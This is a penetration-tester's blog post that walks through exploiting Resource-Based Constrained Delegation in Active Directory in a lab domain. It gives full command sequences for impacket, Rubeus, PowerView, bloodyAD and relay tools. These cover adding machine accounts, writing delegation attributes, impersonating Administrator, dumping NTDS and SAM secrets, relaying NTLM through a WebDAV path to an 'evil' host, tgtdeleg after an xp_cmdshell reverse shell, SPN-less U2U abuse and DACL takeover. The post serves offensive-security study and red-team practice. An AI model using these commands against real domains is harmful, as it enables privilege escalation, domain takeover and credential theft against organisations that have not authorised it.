---
title: "Finding And Exploiting Resource-Based Constrained Delegation"
date: 2024-02-24T01:00:01+02:00
tags:
  - active-directory
  - windows
toc: true
showdate: true
---


Resource-Based Constrained Delegation is an interesting attack, in the right conditions it allows users to take control of computers and domains through the simple use of the very mechanics of the kerberos authentication protocol. 

This blog focuses on demonstrating the practical exploitation of resource-based constrained delegation (RBCD) under different scenarios, both from Linux and Windows. No matter how hard I could try I wouldn't be able to describe the theory behind it better than [Elad Shamir](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) did, so I'm just going to redirect you to his excellent blog if you don't know how it works. If you are already familiar with it and only need a refresher just reading the description of the attacks here may be enough.

---

## BloodHound

Before showing the exploitation steps here are a few words on spotting routes to resource-based constrained delegation. Any one of these relationships going to a computer can lead to a machine takeover through RBCD:
- GenericWrite / GenericAll
- WriteDacl / WriteOwner / Owns
- WriteAccountRestrictions
- AllowedToAct

The following query can be used to spot possible RBCD paths, it excludes Domain and Enterprise Admins, Administrators and Account Operators since they automatically have write permissions on every domain machine:
```text
MATCH q=(u)-[:GenericWrite|GenericAll|WriteDacl|
WriteOwner|Owns|WriteAccountRestrictions|AllowedToAct]->(:Computer)
WHERE NOT u.objectid ENDS WITH "-512" AND NOT
u.objectid ENDS WITH "-519" AND NOT u.objectid ENDS WITH "-544" AND NOT
u.objectid ENDS WITH "-548" RETURN q
```

For exmaple the following three users can take control of ITS-DC1 with RBCD:

![11b705a1db5edbb7790c1dbc1516105f.png](/_resources/11b705a1db5edbb7790c1dbc1516105f.png)

In the case of `GenericWrite` and `GenericAll` relationships the principal has full write permissions on the computer's AD object and can therefore freely modify its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, thus confiiguring delegation.

`WriteDacl`, `WriteOwner` and `Owns` can be exploited to grant the user full write permissions on the computer object, leading to the same scenario as above.

`WriteAccountRestrictions` specifies the user can modify all attributes part of the [User Account Restrictions](https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/) property set, which includes `msDS-AllowedToActOnBehalfOfOtherIdentity`. This permission is typically given to the principals selected on the computer creation window from ADUC, which is used to give unprivileged users the permissions for joining the new computer to the domain:

![5d2d64eab45485bd189270e27a55b11a.png](/_resources/5d2d64eab45485bd189270e27a55b11a.png)

Finally, `AllowedToAct` means the principal is already in the computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, so RBCD is already configured and can be exploited with the S4U method with no additional changes. How convenient!

---

## Computer Takeover

A possible attack leveraging RBCD is a DACL-based computer takeover: if an attacker compromises an account with permissions to modify a computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute then they'll be able to configure RBCD for themselves, and after performing S4U2Self+S4U2Proxy they will receive a ticket to authenticate to the target computer as any user as long as they aren't:
- member of the Protected Users group (empty by default!)
- marked as "user is sensitive and cannot be delegated to" in the UAC options

In order for this method to work the attacker must also control an account with an SPN, as S4U2Self will fail if the requesting service doesn't have one. Normal user accounts don't have an SPN, but if the domain's `ms-DS-MachineAccountQuota` attribute is not 0 (it's 10 by default) any user can add a machine account to the domain, which will satisfy the SPN requirement. Accounts without an SPN can also be exploited for RBCD as we'll see later, but this renders the account unusable so avoid this unless you have an account you know isn't being used.

The attacker can now configure RBCD on the target computer: this is done by adding the controlled machine account to the victim's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, which allows to do the S4U2Self+S4U2Proxy method to obtain a kerberos ticket to impersonate a privileged user on the host, like a domain admin.

What this entails is that if a non-privileged user happens to have write permissions on a computer account they will be able to compromise the host with RBCD.

**Linux Exploitation**

Impacket comes with a handy script to create a machine account:
```text
impacket-addcomputer -computer-name 'rbcd-test$' -computer-pass 'Megaman!1' -dc-ip 192.168.0.100 its-piemonte.local/tantani:'AAAAaaaa!1'
```

![d2923f4058e6fcec44f495b47a7bed76.png](/_resources/d2923f4058e6fcec44f495b47a7bed76.png)

Another impacket tool, rbcd.py, lets us use our permissions to configure RBCD on the target:
```text
impacket-rbcd -delegate-to 'its-dc1$' -delegate-from 'rbcd-test$' -dc-ip 192.168.0.100 -action write its-piemonte/tantani:'AAAAaaaa!1'
```

![ef0f87aabae0a15f57e16f8864e51bfe.png](/_resources/ef0f87aabae0a15f57e16f8864e51bfe.png)

Now that delegation is set we simply request a service ticket with getST.py, which will go through the S4U2Self+S4U2Proxy process and gives us an impersonation ticket:
```text
impacket-getST -spn cifs/its-dc1.its-piemonte.local -impersonate Administrator -dc-ip 192.168.0.100 its-piemonte.local/rbcd-test:'Megaman!1'
```

![2e0cd04310180eb7e53ea5e5ae85bc59.png](/_resources/2e0cd04310180eb7e53ea5e5ae85bc59.png)

We can now authenticate to the host as Administrator using the impersonation TGS. Make sure we can resolve domain names properly and that the host and domain names are the same ones included in the ticket, or kerberos authentication will not work:

![64b1faf1737b3698d4d7d126dadebf50.png](/_resources/64b1faf1737b3698d4d7d126dadebf50.png)

Obviously any service accepting kerberos authentication can be used with the obtained tickets, so if we don't want a simple shell we can dump the host's SAM and LSA secrets with secretsdump, or the whole NTDS database if we have a DC:

![fb855b7da2193660032731c6bdd398b8.png](/_resources/fb855b7da2193660032731c6bdd398b8.png)


A little word on SPNs, while it's always best to have the right kerberos ticket for the desired service impacket can implement a technique called [AnySPN](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/) to help us run our tools even without the right SPN: if impacket detects we don't have the SPN required for the attempted connection it will overwrite the ticket's `sname` field for us, effectively pretending we had the right ticket all along.

For example when we try to use secretsdump with an HTTP TGS the program first looks for a CIFS ticket, it doesn't find one so it forcefully changes the `sname` into CIFS. We can see this process with the debug flag on:

![f12433387fc400f6db239b6a87daeac2.png](/_resources/f12433387fc400f6db239b6a87daeac2.png)

However keep in mind that AnySPN isn't 100% reliable, so always try to have the correct tickets if possible. This means using LDAP for kerberoasting and other AD querying operations, CIFS for smbexec psexec and wmiexec, HTTP for WinRM, HOST for RDP, etc...

**Windows Exploitation**

If we're attacking from Windows [PowerMad](https://github.com/Kevin-Robertson/Powermad) has a cmdlet to let us create machine accounts:
```powershell
New-MachineAccount -MachineAccount baud -Password $(ConvertTo-SecureString 'Baudy16!1' -AsPlainText -Force)
```

![aa2a580450ff9a614c2eb17e22bb80d3.png](/_resources/aa2a580450ff9a614c2eb17e22bb80d3.png)

Configuring RBCD can be done very easily with the official AD PowerShell module, which we can obtain either by installing RSAT or downloading and importing [a standalone copy](https://github.com/samratashok/ADModule):
```powershell
Set-ADComputer its-dc1 -PrincipalsAllowedToDelegateToAccount baud$
```

![059d77ffceb1ac4cebd2fb5a4f815b1f.png](/_resources/059d77ffceb1ac4cebd2fb5a4f815b1f.png)

If we don't want to use the AD module we resort to [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), where we manually build an ACE using our machine account's SID and store it into the attribute:
```powershell
# obtain SID
Get-DomainComputer baud
# build security descriptor
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3543871144-676301019-4006120668-1166)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
# modify the target computer attribute
Get-DomainComputer its-dc1 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

We can now exploit the delegation with the best kerberos exploitcation out there, [Rubeus](https://github.com/GhostPack/Rubeus): in order to do the S4U attack we requires the machine account user's AES256 (`/aes256`) or RC4 (`/rc4`) key, because these make up the long term secret keys used to encrypt kerberos tickets (plus AES128 and DES). If we have a TGT for our machine account we can use that instead.

If RC4 is not disabled we'll see that it coincides with the account's NT hash (this will be useful in the SPN-less attack!). To calculate these we use the `hash` command:
```text
# get SHA256:
Rubeus.exe hash /password:Baudy16!1 /user:baud$ /domain:its-piemonte.local
# get only RC4:
Rubeus.exe hash /password:Baudy16!1
```

The RC4 key is simply an NT hash so we only need our clear text password to calculate it, while the AES keys also require our user's name and domain, because these are used as salt for the hashing algorithm.

![ee6b4a18948568800ef798ab7f9da552.png](/_resources/ee6b4a18948568800ef798ab7f9da552.png)

Armed with a kerberos key we can proceed with the S4U attack specifying an SPN pointing to our target (`/msdsspn`) and a user to impersonate, here we also include the `/ptt` flag to have Rubeus load the TGS into our cache so we can pass the ticket to our target from our attacking host:
```text
Rubeus.exe s4u /user:baud$ /rc4:8F8172E42D04C1934FECC9E8404E2657 /domain:its-piemonte.local /msdsspn:cifs/its-dc1 /impersonateuser:administrator /ptt
```

When requesting a TGS for the host with an SPN like cifs/fqdn I would still get access denied, despite Rubeus successfully generating a ticket for the domain admin account:

![177a77248344bf65726f69436e9709dc.png](/_resources/177a77248344bf65726f69436e9709dc.png)

After a lot of trial and error I found this [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) article that presented the same issue, saying that in order to fix it the SPN should simply be cifs/host instead of cifs/fqdn, so cifs/its-dc1 in the lab example:

![06956724295eb736a2367e678a99b4d7.png](/_resources/06956724295eb736a2367e678a99b4d7.png)

Oddly enough other SPNs like LDAP may only work with a FQDN, and in some networks it doesn't seem to matter, so I am puzzled as to what causes it. Anyway now we can access the target:

![1421ef418558e198349993294ea98daa.png](/_resources/1421ef418558e198349993294ea98daa.png)

Again we can take control of the target with all our favorite lateral movement tools:

![d04e56f97a6f09db002086e3c61bcba4.png](/_resources/d04e56f97a6f09db002086e3c61bcba4.png)

If we give Rubeus the `/nowrap` flag we can see the base64-encoded TGS all in a single block with no spaces, making it easy to copy, paste and decode to a file for use on a different host. Though the ticket will be in .kirbi format and Linux tools like impacket require .ccache files, as with most things in life there is an impacket tool for this:
```text
impacket-ticketConverter rubeusTicket.kirbi impacketTicket.ccache
```

To clean up after ourselves at the end of the engagement we empty out the target's delegation attribute:
```powershell
Set-ADComputer its-dc1 -PrincipalsAllowedToDelegateToAccount $null
```

---

## RBCD + NTLM Relay = LPE

Computers with Windows Server 2016/2019 or Windows 10 can be compromised with an unprivileged account if they have the WebClient service installed, as long as this user is able to either change the user profile picture or the lock screen image, operations that might be blocked through GPO.

These pictures can be hosted over SMB and the computer will try to read them as the SYSTEM account, which means when gathering the file across the network the victim's machine account credentials are transmitted to the file server.

**WebClient**
If the WebClient service is running on the victim the UNC path can point to a WebDAV instance, which is a normal UNC path that also specifies a port where the HTTP-based WebDAV server is listening, this way an NTLM authentication over HTTP occurs as the computer tries to read the image over the network with its credentials:
```text
\\server@80\share\file.jpg
```

NTLM over HTTP doesn't enforce signing and this allows an attacker to relay the authentication attempt to a DC via LDAP, where RBCD can be set up on the victim's machine account towards an account the attacker controls. Once this is done, the attacker is able to impersonate any user on the victim thus achieving local privilege escalation.

So the requirements for the attack are:
- Windows 10 / Server 2016 / Server 2019 (maybe newer versions too but I haven't tested them)
- unprivileged user with access to the victim (preferebily RDP)
- WebClient service installed and running (present by default on Windows workstations but not on servers)
- Responder running / ADIDNS record pointing to the attacker

The latter is required because Windows will only attempt automatic NTLM authentication if the hostname in a UNC path is considered to be part of the "intranet zone", which means it cannot contain any dots: so it cannot be a FQDN or an IP address. To circumvent this Responder can poison LLMNR requests generated by the attempted resolution of non-existing domain names, or we can simply add an ADIDNS record pointing to our attacking machine, something any domain user can do. This can be done with [PowerMad's DNS cmdlets](https://github.com/Kevin-Robertson/Powermad/wiki/Adding-ADIDNS-Records) or [krbrelayx](https://github.com/dirkjanm/krbrelayx)'s dnstool.py.

We can look for potential targets with [WebClientServiceScanner](https://github.com/Hackndo/WebclientServiceScanner), a tool that scans hosts for running WebClient services:
```text
webclientservicescanner its-piemonte/tantani:'AAAAaaaa!1'@targets.txt -dc-ip 192.168.0.100
```

![417c8cbcd49f0809403b0f855a174fc8.png](/_resources/417c8cbcd49f0809403b0f855a174fc8.png)

If we are on a host that has the service installed but not running we can force it to launch even as an unprivileged user by creating a file called [Documents.searchConnector-ms](https://www.bussink.net/webclient_activation/) with this content:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <iconReference>imageres.dll,-1002</iconReference>
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>https://192.168.16.11/0001.ico</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>https://randomsite.com/</url>
    </simpleLocation>
</searchConnectorDescription>
```

The two URLs can be anything we like. Browse to this folder with Explorer and the webclient service will be up and running.

**Exploit**
Elad Shamir's [rbcd_relay.py](https://gist.github.com/3xocyte/4ea8e15332e5008581febdb502d0139c) can exploit the relay to LDAP for us, it also hosts a fake .jpg via a WebDAV server.

```text
\\evil@80\a\test.jpg
```


rbcd_relay only works in Python2 and not in default Kali installations, these are the steps I took to make it work in my lab (do it in a venv or it will break other packages):
```text
git clone <latest impacket>
sudo python2 setup.py install
sudo pip2 -m install pycryptodomex
sudo pip2 -m install pyasn1
sudo pip2 -m install ldap3
```

Launching the script we specify the DC's name, target domain, target computer, and our attacking machine account to delegate:
```text
sudo python2 rbcd_relay.py its-dc1 its-piemonte.local PC2$ baud$
```

With the script running we can open the Windows settings and either browse for a custom lock screen...

![8844181613c632e6b77c270f26bf5cdf.png](/_resources/8844181613c632e6b77c270f26bf5cdf.png)


...or a custom user picture:

![273d2eda61a4e8034c8e2fcf48c2b59c.png](/_resources/273d2eda61a4e8034c8e2fcf48c2b59c.png)

In either case paste your evil WebDAV UNC path on the filename bar of the Open File dialog and you'll have triggered the relay:

![569162600b6c0765919773166cb10941.png](/_resources/569162600b6c0765919773166cb10941.png)

Which means we can fully take control of the victim by impersonating a non-protected domain admin on it:

![20ce683a4d7aee1e1bc4025ed8dec9ac.png](/_resources/20ce683a4d7aee1e1bc4025ed8dec9ac.png)

If we don't have GUI access to the target we can use [Change-Lockscreen](https://github.com/nccgroup/Change-Lockscreen), which triggers the relay from a call to a .NET method:
```text
Change-Lockscreen.exe -FullPath \\evil\a\test.jpg
```

It might give an error like this, but at least during my tests the authentication attempt and delegation worked anyway:

![2b260feb60b6f5089d893a636ddf06ba.png](/_resources/2b260feb60b6f5089d893a636ddf06ba.png)

ntlmrelayx also has the `--serve-image` and `--delegate-access` options to do the attack instead of using rbcd_relay, however it has never worked in my lab for some reason. Regardless, these are the options that would be required:
```text
sudo ntlmrelayx.py -t ldaps://192.168.0.100 --http-port 8080 --serve-image test.png --delegate-access --escalate-user 'baud$' --no-dump --no-da --no-acl
```

---

## Service Account LPE 

An interesting privilege escalation opportunity opens when services running as [virtual accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts) or NETWORK SERVICE (like MSSQL or IIS) are compromised: these use the machine account's credentials when accessing resources over the network, and S4U2Self requests can be made by any machine account without any configuration required.

What this means is that any computer can request the DC for a ticket that impersonates an arbitrary user on itself, so if we are able to gather a machine account's authentication information we can request a TGS for ANY domain user, including protected ones.

A machine account's authentication information is normally completely unavailable to unprivileged users, but Benjamin Delpy discovered a trick where a current user's TGT can be obtained without additional permissions, making this privilege escalation method available in cases where a service instance like a MSSQL server has been compromised, without further setup.

In my lab I have a default installation of MSSQL running under a virtual account, I used xp_cmdshell to open a reverse shell:

![bec094a4318998e6eca6937eb0700339.png](/_resources/bec094a4318998e6eca6937eb0700339.png)

Benjamin Delpy's [tgtdeleg trick](https://github.com/GhostPack/Rubeus#tgtdeleg) has been integrated in rubeus and can therefore be used to obtain the TGT we need to make a S4U2Self request:
```text
rubeus tgtdeleg /nowrap
```

![b91ab99e518eb39dcf9f20567e247d93.png](/_resources/b91ab99e518eb39dcf9f20567e247d93.png)

Now this ticket can be used to request an impersonation TGS with the S4U attack, unlike the other scenarios we also include the `/self` and `/altservice` options, this is not a full RBCD attack as we don't need the S4U2Proxy step. `/altservice` is simply the SPN we want for our TGS:
```
rubeus s4u /impersonateuser:administrator /self /altservice:cifs/sql1 /domain:its-piemonte.local /nowrap /ticket:<TGTDELEG_TICKET>
```

![c111c2ce2b5bb2a103ef774331a4dd04.png](/_resources/c111c2ce2b5bb2a103ef774331a4dd04.png)

Like shown above we can use ticketConverter to convert the rubeus output into a file we can use with tools like psexec, since our access is currently a reverse shell on our Linux machine:
```text
echo <RUBEUS_TICKET> | base64 -d > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
```

![45beb8fa24a8ee4e88c60fe3c0791551.png](/_resources/45beb8fa24a8ee4e88c60fe3c0791551.png)

The CCACHE ticket can be used with the kerberos client as usual, by setting the KRB5CCNAME environment variable to its path. If we place `KRB5CCNAME=ticket.ccache` before the connection command we don't even need the kerberos client installed:

![cb51bd0991a7b3401b2e4a1cf4285837.png](/_resources/cb51bd0991a7b3401b2e4a1cf4285837.png)

---

## SPN-less RBCD

Normally the S4U2Self+Proxy trick only works when we are in control of an account with an SPN, this is because these protocol extensions are meant to be used for delegating and impersonating users on other services, which in kerberos are represented as individual instances by an SPN. Because a normal user doesn't have the permissions of changing its own ServicePrincipalName attribute, in the case a domain has `ms-DS-MachineAccountQuota` set to 0 and we can't control other users with an SPN at least in theory there wouldn't be a way of exploiting RBCD the usual way.

There is however another kerberos extension, called User2User (U2U), which is designed specifically for allowing authentication to a service hosted by a normal user account. Here the role of the SPN is replaced by the Universal Principal Name (UPN), which is given to every domain user. A mario.rossi user of the testlab.com domain will have the UPN mario.rossi@testlab.com.

We can successfuly obtain an impersonation ticket if our user's password (or rather NT hash) and TGT session key match, then obtain a U2U ticket before requesting the final S4U2Proxy ticket. The steps are:
- request a TGT using over-pass-the-hash, thus authenticating with the NT hash, which, if RC4 is enabled, is then used as encryption key for the ticket
- extract the TGT session key
- change user's NT hash into the TGT session key
- S4U2Self + U2U with the new hash, then S4U2Proxy
- if possible restore original password

The limitations of this method are:
- RC4 must be allowed for kerberos (default)
- the account will become unusable for normal users as result of changing the hash to one without a known clear-text
- domain policy might prevent the final password reset without the intervention of a privileged account due to minimum password age requirements

Because of these limitations the attack is only viable if RC4 is enabled and our account isn't being actively used by its owners, since they will inevitably remain locked out of it. If RC4 is disabled then over-pass-the-hash is not possible and the TGT's session key will be encrypted in a different format:

![c5af640326696611228a5bb5cd75a300.png](/_resources/c5af640326696611228a5bb5cd75a300.png)

Impacket's getST.py has a `-u2u` flag but make sure you are using the latest version of the library, the version I found on my Kali didn't have `-u2u` or `-self`.

We start by requesting a TGT with over-pass-the-hash and extracting its session key, which is itself an NT hash:
```text
# getTGT.py -hashes :$(pypykatz crypto nt 'UserPassword') domain/spnless@DC
# describeTicket.py spnless.ccache | grep 'Ticket Session Key'
```

![6d40834798541011e1095bf31ce49dbd.png](/_resources/6d40834798541011e1095bf31ce49dbd.png)

We can now change the user's hash into the session key, this works thanks to calls to Win32 API that support password changes by providing NT hashes instead of a cleartext ([SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)):
```text
changepasswd.py its-piemonte.local/spnless:UserPassword@DC -newhash TGTSESSIONKEY
```

![8993e770c6eaa28840db5b21e72c8d6a.png](/_resources/8993e770c6eaa28840db5b21e72c8d6a.png)

getST.py with the `-u2u` flag will do the rest, obtaining an impersonation ticket from the S4U2Self+U2U --> S4U2Proxy chain:
```text
KRB5CCNAME=spnless.ccache getST.py -u2u -impersonate Administrator -spn host/target -k -no-pass domain/spnless
```

![9bae967a94d585beeb75b6cb8a764922.png](/_resources/9bae967a94d585beeb75b6cb8a764922.png)

Rubeus also has a `/u2u` flag to do the attack from Windows:
```text
PS > .\Rubeus.exe s4u /u2u /user:spnless /rc4:TGTSESSIONKEY /impersonateuser:administrator /msdsspn:host/target /createnetonly:C:\Windows\System32\cmd.exe /show
```

`/createnetonly` and `/show` will create a new process, cmd.exe in this case, in a visible window that will inherit the impersonation ticket. These options are also useful when requesting and loading a TGT with `/ptt` without wanting to discard the session's current TGT, since any logon session can only keep one TGT in cache and a new ticket will replace the first.

For those interested in knowing a little more about the inner workings of this attack, the password change requirement didn't make much sense to me until I read this [IETF document](https://datatracker.ietf.org/doc/html/draft-swift-win2k-krb-user2user-01) about U2U:
```text
The Kerberos user to user authentication mechanism allows for a client application to connect to a service that is not in possession of a long term secret key.
Instead, the session ticket from the KERB-AP-REQ is encrypted using the session key from the service's ticket granting ticket
```

Normal TGS tickets are encrypted with a secret derivated from the user's password, like their NT hash, AES keys, and so on. These are the so called long term keys. U2U however was designed specifically for principals without long term keys, so the service account's TGT session key is used instead.

The problem is that for the delegation attack to work this U2U TGS now needs to be embedded in a S4U2Proxy request, where the KDC, expecting a normal TGS, will try to decrypt it with the user's long term key, inevitably failing.

The trick here is that if we get a TGT encrypted with RC4 its session key will effectively be an NT hash, and we can sneakily use this hash to change our user's credentials with specific Win32 APIs that accept an NT hash instead of a clear text.

Now we can use the TGT to request a ticket for ourselves (S4U2Self) to our UPN (U2U), thus receiving a TGS encrypted with the aforementioned session key. If now we send the TGS in a S4U2Proxy request the KDC will try to decrypt it with our user's long term RC4 key, so its NT hash, and by pure "coincidence" this just so happens to be the same as its actual encryption key, thus resulting in a valid ticket!

---

## RBCD Via DACL Modification

The last attack I'm going to cover is only a slight variation to the first computer takeover directive, where a couple steps are added at the beginning to modify a computer's DACL. It can apply when our controlled principal has either `WriteOwner`, `Owns` or `WriteDacl` permissions. (obviously the ownership change step only applies to `WriteOwner`)

The situation is the following, DACL_TEST is our compromised user and has `WriteOwner` permissions on a host:

![6713c6c15f27046a13e629b70d18b168.png](/_resources/6713c6c15f27046a13e629b70d18b168.png)

The objective is to grant ourselves write access to the computer so that we can modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. Before we can do this we need to set ourselves as the computer owner though, and this will implicitely grant us permissions to edit the computer's DACL.

To change an AD object's owner from Linux we have two options: [owneredit.py](https://github.com/ShutdownRepo/impacket/blob/owneredit/examples/owneredit.py) and [BloodyAD](https://github.com/CravateRouge/bloodyAD). owneredit.py is written with impacket but hasn't been integrated in the official examples yet, but making use of said library its syntax is the same as all the other impacket scripts:
```text
owneredit.py its-piemonte.local/DACL_Test:'Example!1'@its-dc1 -target 'its-dc1$' -action write -new-owner DACL_Test
```

Unfortunately the script refuses to work in my lab, complaining about invalid credentials when in reality other tools work just fine. BloodyAD can be used instead to change the computer ownership and DACL:
```text
# bloodyAD --host 192.168.0.100 -d its-piemonte -u DACL_Test -p 'Example!1' set owner 'its-dc1$' DACL_Test
# bloodyAD --host 192.168.0.100 -d its-piemonte -u DACL_Test -p 'Example!1' add genericAll 'its-dc1$' DACL_Test
```

![7399e498eef791eaa62d8cab0f1f249c.png](/_resources/7399e498eef791eaa62d8cab0f1f249c.png)

With this our user now has GenericAll on ITS-DC1, so the normal delegation attack can be carried out as already seen:

![f2321cd8713a0b29a6838ad9b5b09cc2.png](/_resources/f2321cd8713a0b29a6838ad9b5b09cc2.png)

[dacledit.py](https://github.com/ShutdownRepo/impacket/blob/dacledit/examples/dacledit.py) can be used to edit the DACL instead of bloodyAD but once again the script wouldn't work in my lab.

Finally, if we are on Windows PowerView can be used to both modify the computer's owner and its DACL:
```text
# Set-DomainObjectOwner -TargetIdentity TargetComputer -OwnerIdentity AttackerUser
# Add-DomainObjectAcl -TargetIdentity TargetComputer -Rights All
```

The example above assumes we are already running PowerView in the context of AttackerUser, otherwise we'need to pass Set-DomainObjectOwner also a `-Credential` parameter with the user's name and encrypted password:
```text
# $pass = ConvertTo-SecureString 'StrongPassword!1' -AsPlainText -Force
# $cred = New-Object System.Management.Automation.PSCredential('DOMAIN\\AttackerUser', $pass)
# Set-DomainObjectOwner -Credential $cred -TargetIdentity TargetComputer -OwnerIdentity AttackerUser
```

---

**References**
- https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
- https://eladshamir.com/2019/08/08/Lock-Screen-LPE.html
- https://exploit.ph/delegate-2-thyself.html
- https://exploit.ph/revisiting-delegate-2-thyself.html
- https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/
- https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/
- https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html
- https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd